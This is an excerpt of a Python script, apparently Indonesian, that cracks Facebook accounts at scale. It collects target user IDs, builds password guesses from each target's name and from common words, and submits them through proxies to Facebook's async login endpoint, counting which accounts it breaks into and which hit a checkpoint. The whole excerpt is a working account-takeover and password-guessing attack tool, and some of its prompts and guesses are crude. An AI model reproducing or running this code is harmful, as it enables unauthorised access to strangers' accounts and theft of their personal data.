...
def mandaku(my_name,my_id):
    ...
    os.system('clear')
    logo()
    print(f"ᄂ {BB}Your Account Facebook{N}\n")
    print(f"ᄂ Your Account Name ↪ {H}{my_name}{N}")
    print(f"ᄂ Your Account ID   ↪ {H}{my_id}{N}")
    print(f"ᄂ Your Public  IP   ↪ {M}{IP}{N}")
    print(47*"°")
    print(f" ↪ {BB}MENU CRACKED{N}\n")
    print(f' ᄂ {H}1{A} Start Cloning Multi Publik ↪ {H}ON{N} ')
    print(f' ᄂ {H}2{A} Start Cloning Email  ↪ {H}ON{N} ')
    print(f' ᄂ {H}3{A} Start Cloning Name  ↪ {H}ON{N} ')
    print(f' ᄂ {H}4{A} Start File Cloning   ↪ {H}ON{N} ')
    print(f' ᄂ {H}6{A} Tap Yes  ↪ {H}ON{N} ')
    print(f' ᄂ {B}E{A} {M}Exit {N} ')
    #print(' ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(' ᄂ How many IDs do you want ? : '))
	except ValueError:
		print(' ᄂ enter numbers not letters ')
		exit()
	if jum<1 or jum>100:
		print(' ᄂ Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' ᄂ Input Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print(' ᄂ Sinyal Loh Kek Kontoll ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		...
		print(f'└── {K} Pertemanan Tidak Public {M}')
		time.sleep(3)
		exit()
...
def setting():
	#print("")
	print(f'\r ᄂ Total ID Collected : {H}{len(dump)}{N} ')
	print(f' ↪ {H}menampilkan Cookies maka akun akan mudah terkena {M}chekpoint\n {N}↪{H} dikarenakan memakai module requests berlebihan.\n {N}↪ {H}tidak di sarankan untuk menampilkan Cookies {N}')
	print(' ᄂ Ingin Menampilkan Cookies y/t ? ')
	aplik = input('Choose : ')
	if aplik in ['y','Y']:
		taplikasi.append('y')
		urut()
...
def urut():
	#info()
	#print(47*"•")
    print('\n\t   ⟼ %s1%s Crack Old ID  ⟼ %sFast%s'%(H,A,M,N))
    print('\t   ⟼ %s2%s Crack New ID  ⟼ %sMedium%s'%(H,A,K,N))
    print('\t   ⟼ %s3%s Crack Random  ⟼ %sSlow%s'%(H,A,H,N))
    hu = input(' Choose : ')
    if hu in ['1','01']:
        ...
        exit()
    print(47*"•")
    print('\t   ⟼ %s1%s Method mobile   ⟼ %sAsync%s'%(H,A,M,N))
    print('\t   ⟼ %s2%s Method free ⟼ %sAsync%s'%(H,A,K,N))
    print('\t   ⟼ %s3%s Method mbasic ⟼ %sAsync%s'%(H,A,H,N))
    hc = input('Choice : ')
    if hc in ['1','01']:
        ...
        method.append('mobile')
    print('%s════════════════════════════════════════\n %sPassword Metode%s'%(N,BB,N))
    print('\n\t    %s➛ %s1%s Password Gabung%s'%(N,H,A,N))
    print('\t    %s➛ %s2%s Password Auto%s'%(N,H,A,N))
    print('\t    %s➛ %s3%s Password FullName%s'%(N,H,A,N))
    ch = input('Method : ')
    if ch in ['1','01']:gabung()
    elif ch in ['2','02']:otomatis()
    elif ch in ['3','03']:fullname()
    else:otomatis()
	...
	with prog:
		...
		#with ThreadPoolExecutor(max_workers=30) as pool:
			for akun in id2:
				...
				depan = nama.split(" ")[0]
				pwv = ['123456','katasandi','kontol','bismillah','sayang','indonesia','sayangkamu','sayangku','akusayangkamu']
				if len(nama)<=5:
...
def crack(idf,pwv,url):
	global loop,ok,cp
	prog.update(des,description=f'[deep_pink3]{str(loop)}/{len(id2)}[/] OK : [green]{len(ok)}[/] CP : [yellow]{len(cp)}[/]')
	prog.advance(des)
	ses = requests.Session()
	...
	for pw in pwv:
		try:
			...
			bz = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head, proxies=proxy)
